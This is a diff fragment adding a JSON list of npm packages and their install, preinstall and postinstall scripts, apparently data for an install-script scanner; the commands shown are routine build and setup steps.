+      "name": "@water8797/scan-test-large-0812",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@prisma/engines",
+      "version": "7.10.0",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@abc54d/postinstall-hello-world",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node index.js"
+      }
+    },
+    {
+      "name": "@mui/x-telemetry",
+      "version": "9.13.0",
+      "scripts": {
+        "postinstall": "node ./postinstall/index.mjs"
+      }
+    },
+    {
+      "name": "@togo-framework/cli",
+      "version": "0.2.31",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "@marstamm/test-child",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "echo 'postinstall in child called'"
+      }
+    },
+    {
+      "name": "csv-handler-totally-safe",
+      "version": "1.4.0",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "@waynevanson/script-context",
+      "version": "0.3.2",
+      "scripts": {
+        "install": "yarn build-release"
+      }
+    },
+    {
+      "name": "aws-r",
+      "version": "0.0.3",
+      "scripts": {
+        "postinstall": "chmod a+x installR.sh && ./installR.sh"
+      }
+    },
+    {
+      "name": "esus62testinstall",
+      "version": "0.0.3",
+      "scripts": {
+        "install": "node postinstall.js"
+      }
+    },
+    {
+      "name": "wbl-sdk",
+      "version": "0.1.2",
+      "scripts": {
+        "postinstall": "node postinstall.cjs"
+      }
+    },
+    {
+      "name": "failing-pkg",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "exit 1"
+      }
+    },
+    {
+      "name": "growthbook",
+      "version": "2.5.0",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "soda-tool",
+      "version": "2.0.0",
+      "scripts": {
+        "postinstall": "node ./scripts/test.js"
+      }
+    },
+    {
+      "name": "my-skill-set",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.mjs"
+      }
+    },
+    {
+      "name": "wbl-go",
+      "version": "0.1.2",
+      "scripts": {
+        "postinstall": "node postinstall.cjs"
+      }
+    },
+    {
+      "name": "npm-adblock-patch",
+      "version": "0.1.1",
+      "scripts": {
+        "postinstall": "node ./hookNpm.js"
+      }
+    },
+    {
+      "name": "@inosx/agent-memory",
+      "version": "0.4.0",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.mjs"
+      }
+    },
+    {
+      "name": "jsinstallguard",
+      "version": "0.1.8",
+      "scripts": {
+        "postinstall": "node ./postinstall.js"
+      }
+    },
+    {
+      "name": "ringfence",
+      "version": "0.2.6",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.mjs"
+      }
+    },
+    {
+      "name": "np-audit-test-obfuscated",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "postinstall-error",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "not-exist-command"
+      }
+    },
+    {
+      "name": "np-audit-test-clean",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "npm-directories-test",
+      "version": "0.1.4",
+      "scripts": {
+        "postinstall": "node index"
+      }
+    },
+    {
+      "name": "lifecycle-tester",
+      "version": "1.0.3",
+      "scripts": {
+        "preinstall": "echo \"Hello from preinstall, I shouldn't be enabled\" && exit 1",
+        "postinstall": "echo \"Hello from postinstall, I shouldn't be enabled\" && exit 1"
+      }
+    },
+    {
+      "name": "@rust-sandbox/rust-1-95-x86_64-linux",
+      "version": "1.95.0",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "red-team-brasil",
+      "version": "0.0.1",
+      "scripts": {
+        "preinstall": "node ./scripts/preinstall.js",
+        "postinstall": "node ./scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@dormon/ultraforce-mcp",
+      "version": "0.3.13",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "vue-inbrowser-compiler-demi",
+      "version": "4.71.1",
+      "scripts": {
+        "postinstall": "node ./postinstall.js"
+      }
+    },
+    {
+      "name": "clawlego",
+      "version": "0.0.18",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "esbuild-experimental-optdeps",
+      "version": "0.12.10",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "when-was-this-module-built",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "./build.sh"
+      }
+    },
+    {
+      "name": "local-cypress",
+      "version": "1.2.8",
+      "scripts": {
+        "postinstall": "node ./postinstall"
+      }
+    },
+    {
+      "name": "postinstall-script-package",
+      "version": "1.0.3",
+      "scripts": {
+        "postinstall": "node index.js"
+      }
+    },
+    {
+      "name": "protoc-gen-js",
+      "version": "4.0.2",
+      "scripts": {
+        "postinstall": "node post-install.js"
+      }
+    },
+    {
+      "name": "srcdev-nuxt-components",
+      "version": "9.4.7",
+      "scripts": {
+        "postinstall": "node scripts/copy-snippets.mjs"
+      }
+    },
+    {
+      "name": "@conscience-technology/nora",
+      "version": "0.0.24",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@wilsoon/eslint-config",
+      "version": "0.4.2",
+      "scripts": {
+        "postinstall": "node ./scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@xxz_cocoscreator/framework-packages",
+      "version": "1.0.2",
+      "scripts": {
+        "postinstall": "node scripts/sync.mjs"
+      }
+    },
+    {
+      "name": "watchmen-cli",
+      "version": "2.5.8",
+      "scripts": {
+        "postinstall": "node bin/wm-install-shim.js"
+      }
+    },
+    {
+      "name": "@higgsfield/cli",
+      "version": "1.1.24",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "passoff",
+      "version": "0.1.0",
+      "scripts": {
+        "postinstall": "node scripts/install-skills.js --postinstall"
+      }
+    },
+    {
+      "name": "@db-ux/db-theme-illustrative-icons",
+      "version": "3.3.1",
+      "scripts": {
+        "postinstall": "node build/scripts/index.js"
+      }
+    },
+    {
+      "name": "@agentistics/agentop",
+      "version": "2.38.0",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "dicom-dimse-native",
+      "version": "2.6.1",
+      "scripts": {
+        "install": "npx prebuild-install -r napi || node ./scripts/compile-native.js"
+      }
+    },
+    {
+      "name": "win-version-info",
+      "version": "6.0.1",
+      "scripts": {
+        "install": "node skip.js || node-gyp-build"
+      }
+    },
+    {
+      "name": "@milaboratories/pframes-rs-node",
+      "version": "1.1.59",
+      "scripts": {
+        "install": "node-pre-gyp install --update-binary --fallback-to-build=false || node -p \"process.exit(+!(require('./package.json').version === '0.0.0'))\""
+      }
+    },
+    {
+      "name": "utimes",
+      "version": "5.2.1",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "native-cursor",
+      "version": "1.1.8",
+      "scripts": {
+        "install": "node -e \"\""
+      }
+    },
+    {
+      "name": "reliance-dicom-dimse-native",
+      "version": "2.4.2",
+      "scripts": {
+        "install": "npx prebuild-install -r napi || npx cmake-js compile"
+      }
+    },
+    {
+      "name": "@stagetimerio/grandiose",
+      "version": "0.2.0",
+      "scripts": {
+        "install": "node scripts/ndi.js && node-gyp rebuild && node scripts/dist.js"
+      }
+    },
+    {
+      "name": "@microsoft/winappcli",
+      "version": "0.6.2",
+      "scripts": {
+        "postinstall": "node -e \"console.log('\\\\n\ud83c\udf89 Windows App Development CLI installed successfully!\\\\n\\\\nGet started with: npx winapp --help\\\\n')\""
+      }
+    },
+    {
+      "name": "harper-fabric-embeddings",
+      "version": "0.5.0",
+      "scripts": {
+        "postinstall": "node setup.js"
+      }
+    },
+    {
+      "name": "linux-device",
+      "version": "2.1.4",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@ronomon/reed-solomon",
+      "version": "6.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild",
+        "postinstall": "node-gyp clean"
+      }
+    },
+    {
+      "name": "@milaboratories/pframes-node",
+      "version": "2.2.6",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build --runtime=electron --target=20.12.2"
+      }
+    },
+    {
+      "name": "@oxmc/node-gpuinfo",
+      "version": "1.1.0",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "zip-node-addon",
+      "version": "0.0.11",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "nodeimu",
+      "version": "2.1.12",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "trader-backtest",
+      "version": "1.0.2",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "monero-nodejs-libwallet",
+      "version": "0.3.11",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "@utexo/rgb-lightning-node-bare",
+      "version": "0.1.0-beta.20",
+      "scripts": {
+        "postinstall": "node scripts/install-native-artifacts.js"
+      }
+    },
+    {
+      "name": "audio-rtp-tools",
+      "version": "1.4.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "actual-crash",
+      "version": "1.0.3",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "ih-lib60870-node",
+      "version": "1.0.75",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@telepilotco/tdlib-binaries-prebuilt",
+      "version": "1.8.14",
+      "scripts": {
+        "install": "node-pre-gyp install --library=static_library"
+      }
+    },
+    {
+      "name": "node-addon-example",
+      "version": "0.1.5",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "node-addon-example2",
+      "version": "0.1.3",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "mk-node-addon-example",
+      "version": "0.1.8",
+      "scripts": {
+        "preinstall": "npm install node-pre-gyp",
+        "install": "node-pre-gyp install"
+      }
+    },
+    {
+      "name": "workspace-publishing",
+      "version": "2.0.3",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "@telepilotco/tdlib-addon-prebuilt",
+      "version": "0.1.1",
+      "scripts": {
+        "install": "node-pre-gyp install --library=static_library"
+      }
+    },
+    {
+      "name": "@deepfocus/get-windows",
+      "version": "1.0.21",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "mjl-random-num-gen",
+      "version": "1.0.5",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build --ignore-scripts"
+      }
+    },
+    {
+      "name": "hello_publishing-native-pre-gyp",
+      "version": "1.0.4",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "@ladvace/get-windows",
+      "version": "2.0.4",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "naudiodon",
+      "version": "2.3.6",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "ffi",
+      "version": "2.3.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "koffi",
+      "version": "3.2.1",
+      "scripts": {
+        "install": "node ./cnoke.cjs -P . -D src/koffi --prebuild --release"
+      }
+    },
+    {
+      "name": "@2060.io/ffi-napi",
+      "version": "4.0.9",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "steamworks-ffi-node",
+      "version": "0.11.2",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "@makeomatic/ffi-napi",
+      "version": "4.2.0",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@napi-ffi/ffi-napi",
+      "version": "4.0.7",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@ohos-ports/ffi-napi",
+      "version": "4.0.3-beta.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@secondts/bark-react-native",
+      "version": "0.24.0",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@xingrz/ffi-napi",
+      "version": "4.1.0-alpha.1",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@lwahonen/ffi-napi",
+      "version": "4.0.12",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@jellybrick/ffi-napi",
+      "version": "4.0.18",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "ffi-ianli",
+      "version": "2.2.1",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@breush/ffi-napi",
+      "version": "4.0.13",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "fixed-ffi",
+      "version": "12.2.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "ffi-napi-v22",
+      "version": "0.0.1",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@saleae/ffi",
+      "version": "3.0.2",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@tigerconnect/ffi-napi",
+      "version": "4.0.3-tc3",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "ffi-cross",
+      "version": "5.0.11",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "dby-node-ffi",
+      "version": "2.3.7",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@httptoolkit/ffi-napi",
+      "version": "2.5.0-test3",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@alexssmusica/ffi-napi",
+      "version": "4.0.26",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "holdkit-ffi-napi",
+      "version": "1.0.2",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@unomed/react-native-matrix-sdk",
+      "version": "0.9.1",
+      "scripts": {
+        "postinstall": "patch-package && node scripts/download-binaries.js"
+      }
+    },
+    {
+      "name": "@aabuhijleh/ffi",
+      "version": "2.4.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@rikumi/ffi",
+      "version": "2.3.1",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@eleccookie/ffi-napi",
+      "version": "0.0.1",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "lentil-node-ffi-electron5",
+      "version": "0.0.2",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "electron-node-ffi",
+      "version": "4.0.5",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "ffi-shyp",
+      "version": "0.1.0",
+      "scripts": {
+        "install": "node shyp-blacklist.js win32-x64 win32-ia32 darwin-x64 || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@ohos-ports/koffi",
+      "version": "2.16.2-beta.0",
+      "scripts": {
+        "install": "node src/cnoke/cnoke.js -P . -D src/koffi --prebuild"
+      }
+    },
+    {
+      "name": "@krvikash35/ffi",
+      "version": "2.2.2",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "@larriereguichet/ffi-napi",
+      "version": "4.0.5",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "ffiko",
+      "version": "2.0.2",
+      "scripts": {
+        "install": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "ffi-ios",
+      "version": "2.2.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "murmur-hash-ffi",
+      "version": "0.3.0",
+      "scripts": {
+        "install": "pushd lib; cargo build --lib --release; popd"
+      }
+    },
+    {
+      "name": "kiwi-ffi",
+      "version": "2.3.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "cj-ffi",
+      "version": "2.2.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "ffi-atom-shell",
+      "version": "3.0.1",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "castrum",
+      "version": "0.9.6",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.mjs"
+      }
+    },
+    {
+      "name": "@ebowwa/quant-rust",
+      "version": "0.2.2",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.cjs"
+      }
+    },
+    {
+      "name": "urb-ffi",
+      "version": "0.2.0",
+      "scripts": {
+        "install": "node ./bindings/node/scripts/build.js"
+      }
+    },
+    {
+      "name": "@netunhb/ffi-napi",
+      "version": "4.0.16",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "ffi-node-patch",
+      "version": "2.2.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "ueye",
+      "version": "1.1.6",
+      "scripts": {
+        "install": "(mkdir build; cd build && cmake .. && make) || true"
+      }
+    },
+    {
+      "name": "@dryft/tlsclient",
+      "version": "1.0.8",
+      "scripts": {
+        "postinstall": "node ./scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@coderwxl/ffi-napi",
+      "version": "5.0.1",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@shxiaj/everything-mcp",
+      "version": "1.0.1",
+      "scripts": {
+        "postinstall": "echo 'Make sure Everything is running before using this MCP server'"
+      }
+    },
+    {
+      "name": "@openim/ffi-napi",
+      "version": "4.0.14",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "rust-ffi",
+      "version": "3.0.0",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "azuretls",
+      "version": "0.0.8",
+      "scripts": {
+        "postinstall": "node lib/scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@energypatrikhu/ffi-napi",
+      "version": "4.1.1",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "ffi2",
+      "version": "1.2.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "argon2-ffi",
+      "version": "2.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "modern-syslog",
+      "version": "1.2.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "nan-hello-world",
+      "version": "2.1.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "nan-async-example",
+      "version": "0.1.3",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "nan-bcrypt",
+      "version": "0.7.9",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@ssimicro/postmodern-syslog",
+      "version": "3.0.2",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "noble-nan",
+      "version": "0.3.7",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "sypexgeo-nan",
+      "version": "0.1.2",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "xpc-connection-nan",
+      "version": "0.0.4",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "nan-demo",
+      "version": "0.0.1",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "strong-syslog",
+      "version": "1.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "xxhash-nan",
+      "version": "0.9.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "simple-syslog",
+      "version": "1.0.2",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "objwrap-plate",
+      "version": "1.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "libwebview-nodejs",
+      "version": "0.12.2",
+      "scripts": {
+        "install": "cmake-js rebuild"
+      }
+    },
+    {
+      "name": "xxhash32-node-cmake",
+      "version": "1.1.2",
+      "scripts": {
+        "preinstall": "bash util/help-install.sh",
+        "install": "cmake-js compile"
+      }
+    },
+    {
+      "name": "@stoneydsp/cmodule",
+      "version": "1.0.1",
+      "scripts": {
+        "install": "cmake-js compile"
+      }
+    },
+    {
+      "name": "magnumintegrationjs",
+      "version": "0.0.2",
+      "scripts": {
+        "postinstall": "cross-var npm run compile && cross-var npm run cinstall"
+      }
+    },
+    {
+      "name": "@julusian/jpeg-turbo",
+      "version": "3.0.1",
+      "scripts": {
+        "install": "pkg-prebuilds-verify ./binding-options.js || cmake-js compile --target jpeg-turbo"
+      }
+    },
+    {
+      "name": "@mikrojs/quickjs",
+      "version": "0.20.1",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "fontnik",
+      "version": "0.7.7",
+      "scripts": {
+        "install": "node scripts/install-native.js"
+      }
+    },
+    {
+      "name": "catboost",
+      "version": "1.27.0",
+      "scripts": {
+        "install": "node ./build_scripts/bootstrap.js install"
+      }
+    },
+    {
+      "name": "@andersbakken/fisk-native",
+      "version": "25.0.0",
+      "scripts": {
+        "install": "node ./build.js"
+      }
+    },
+    {
+      "name": "libsamplerate",
+      "version": "2.1.1",
+      "scripts": {
+        "install": "pkg-prebuilds-verify ./binding-options.js || cmake-js compile -p 4"
+      }
+    },
+    {
+      "name": "pocketsphinx",
+      "version": "5.0.7",
+      "scripts": {
+        "install": "cmake-js compile"
+      }
+    },
+    {
+      "name": "@babylonjs/react-native",
+      "version": "2.0.5",
+      "scripts": {
+        "postinstall": "node ./postinstall.js"
+      }
+    },
+    {
+      "name": "tdl",
+      "version": "8.1.0",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@microsoft/cpp-language-server",
+      "version": "0.2.3",
+      "scripts": {
+        "postinstall": "node lib/postinstall.js"
+      }
+    },
+    {
+      "name": "cmake",
+      "version": "0.0.4",
+      "scripts": {
+        "install": "make"
+      }
+    },
+    {
+      "name": "@vencord/venmic",
+      "version": "7.2.3",
+      "scripts": {
+        "install": "pkg-prebuilds-verify ./lib/options.js || (pnpm run configure && pnpm run build)"
+      }
+    },
+    {
+      "name": "test-gcanvas-node",
+      "version": "1.0.1",
+      "scripts": {
+        "install": "./script/install.sh $local"
+      }
+    },
+    {
+      "name": "rm-point-cloud-calculation-napi",
+      "version": "1.0.9",
+      "scripts": {
+        "install": "cmake-js compile --CDCMAKE_BUILD_TYPE=Release"
+      }
+    },
+    {
+      "name": "sack.vfs",
+      "version": "1.3.133",
+      "scripts": {
+        "install": "npm run build-vfs"
+      }
+    },
+    {
+      "name": "forwarder-node",
+      "version": "0.0.126",
+      "scripts": {
+        "install": "cmake-js build"
+      }
+    },
+    {
+      "name": "@altronix/linq",
+      "version": "0.3.0-rc.1",
+      "scripts": {
+        "preinstall": "npm run build -- -cD",
+        "postinstall": "npm run build -- -ntfx"
+      }
+    },
+    {
+      "name": "@acomsys/dash-utils",
+      "version": "0.0.17",
+      "scripts": {
+        "install": "prebuild-install --backend cmake-js --runtime napi || npm run build"
+      }
+    },
+    {
+      "name": "vstjs",
+      "version": "0.0.4",
+      "scripts": {
+        "install": "cmake-js compile"
+      }
+    },
+    {
+      "name": "cmake-binaries",
+      "version": "1.0.5-2",
+      "scripts": {
+        "preinstall": "node preinstall.js"
+      }
+    },
+    {
+      "name": "audify",
+      "version": "1.10.1",
+      "scripts": {
+        "install": "prebuild-install -r napi || npm run rebuild"
+      }
+    },
+    {
+      "name": "vst-js",
+      "version": "0.0.0",
+      "scripts": {
+        "install": "cmake-js compile"
+      }
+    },
+    {
+      "name": "librats",
+      "version": "2.3.7",
+      "scripts": {
+        "preinstall": "node scripts/build-librats.js",
+        "install": "node-gyp rebuild",
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@rushikesh.halle/cmake-js-module",
+      "version": "1.1.0",
+      "scripts": {
+        "install": "cmake-js compile"
+      }
+    },
+    {
+      "name": "node-librealsense",
+      "version": "0.2130.0",
+      "scripts": {
+        "preinstall": "node scripts/npm_dist/build-librealsense.js",
+        "install": "node-gyp rebuild",
+        "postinstall": "node scripts/generate-doc.js"
+      }
+    },
+    {
+      "name": "node-anonize2-relic",
+      "version": "0.1.6",
+      "scripts": {
+        "install": "node preflight.js && node-gyp configure build"
+      }
+    },
+    {
+      "name": "crypto-incognito",
+      "version": "0.0.2",
+      "scripts": {
+        "preinstall": "npm run vendor:autogen && npm run cpp:build",
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "opencc",
+      "version": "1.4.2",
+      "scripts": {
+        "install": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "@lynx-js/cef-webview",
+      "version": "0.0.22",
+      "scripts": {
+        "postinstall": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "tinycv",
+      "version": "2.0.5",
+      "scripts": {
+        "install": "prebuild-install --runtime napi || cmake-js compile"
+      }
+    },
+    {
+      "name": "@tech9app/whisper.js",
+      "version": "1.0.29",
+      "scripts": {
+        "install": "cd whisper.cpp && make && cd .. && npx cmake-js compile -T whisper-addon -B Release"
+      }
+    },
+    {
+      "name": "ffmpeg-nodejs",
+      "version": "0.4.4",
+      "scripts": {
+        "postinstall": "cmake-js compile"
+      }
+    },
+    {
+      "name": "chatglmjs",
+      "version": "0.0.11",
+      "scripts": {
+        "postinstall": "npm run cmake"
+      }
+    },
+    {
+      "name": "vcpkg.cmd",
+      "version": "1.2026.2",
+      "scripts": {
+        "install": "install.cmd"
+      }
+    },
+    {
+      "name": "native-graphics-deps",
+      "version": "0.0.22",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "@opendesign/engine-source",
+      "version": "0.4.0",
+      "scripts": {
+        "install": "node ode-napi/try-importing-prebuilt.mjs || cmake-js compile -O build/npm --CDODE_TEST_MODULES=OFF --CDODE_SKIA_GPU=OFF"
+      }
+    },
+    {
+      "name": "zadeh",
+      "version": "3.0.0-beta.4",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "ai-sdk-llama-cpp",
+      "version": "0.7.1",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.cjs"
+      }
+    },
+    {
+      "name": "eada-cpu",
+      "version": "1.0.11",
+      "scripts": {
+        "install": "prebuild-install --runtime napi --verbose || (npm run build && npm run copy-build)"
+      }
+    },
+    {
+      "name": "@amigocloud/mapbox-gl-native",
+      "version": "5.0.1",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build=false"
+      }
+    },
+    {
+      "name": "node-pserver",
+      "version": "1.0.6",
+      "scripts": {
+        "install": "node setup.js"
+      }
+    },
+    {
+      "name": "eryn",
+      "version": "0.3.2",
+      "scripts": {
+        "install": "(node build-check.js || npm run rebuild)"
+      }
+    },
+    {
+      "name": "pandoc-converter",
+      "version": "12.0.0",
+      "scripts": {
+        "postinstall": "node -r global-agent/bootstrap -e \"require('github-packager').UpdateBinary()\""
+      }
+    },
+    {
+      "name": "ffmpeg-static",
+      "version": "5.3.0",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "geckodriver",
+      "version": "6.1.1",
+      "scripts": {
+        "postinstall": "test -f ./dist/install.js && node ./dist/install.js || echo \"Skipping install, project not built!\""
+      }
+    },
+    {
+      "name": "pandocjs",
+      "version": "2.9.2-1.1",
+      "scripts": {
+        "postinstall": "node -e \"require('github-release-packager').UpdateBinary()\""
+      }
+    },
+    {
+      "name": "saucectl",
+      "version": "0.214.0",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "@derhuerst/ffprobe-static",
+      "version": "5.3.0",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "ffmpeg-ffprobe-static",
+      "version": "6.1.2-rc.1",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "node",
+      "version": "26.8.2",
+      "scripts": {
+        "preinstall": "node installArchSpecificPackage"
+      }
+    },
+    {
+      "name": "elm",
+      "version": "0.19.2-0",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "chromedriver",
+      "version": "153.0.0",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "compress-pdf",
+      "version": "0.6.3",
+      "scripts": {
+        "postinstall": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "@testplane/geckodriver",
+      "version": "5.0.2",
+      "scripts": {
+        "postinstall": "test -f ./dist/install.js && node ./dist/install.js || echo \"Skipping install, project not build!\""
+      }
+    },
+    {
+      "name": "agent-browser",
+      "version": "0.37.1",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@percy/core",
+      "version": "1.32.9",
+      "scripts": {
+        "postinstall": "node ./post-install"
+      }
+    },
+    {
+      "name": "@sitespeed.io/geckodriver",
+      "version": "0.37.1",
+      "scripts": {
+        "install": "node install.js"
